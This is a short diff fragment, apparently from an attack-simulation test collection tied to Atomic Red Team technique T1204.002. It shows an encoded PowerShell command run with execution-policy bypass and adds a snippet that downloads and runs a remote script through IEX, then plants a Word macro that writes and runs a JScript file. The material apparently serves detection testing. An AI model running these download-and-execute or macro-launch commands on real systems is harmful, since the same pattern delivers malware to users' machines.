@@ -71,4 +71,6 @@ powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhA
 
 
 *
-curl -O https://eternallybored.org/misc/wget/current/wget.exe
+@echo off
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -UseBasicParsing); $macrocode = '   Open ''C:\Users\Public\art.jse'' For Output As #1`n   Write #1, ''WScript.Quit''`n   Close #1`n   Shell`$ ''cscript.exe C:\Users\Public\art.jse''`n'; Invoke-MalDoc -macroCode $macrocode -officeProduct 'Word'"
+
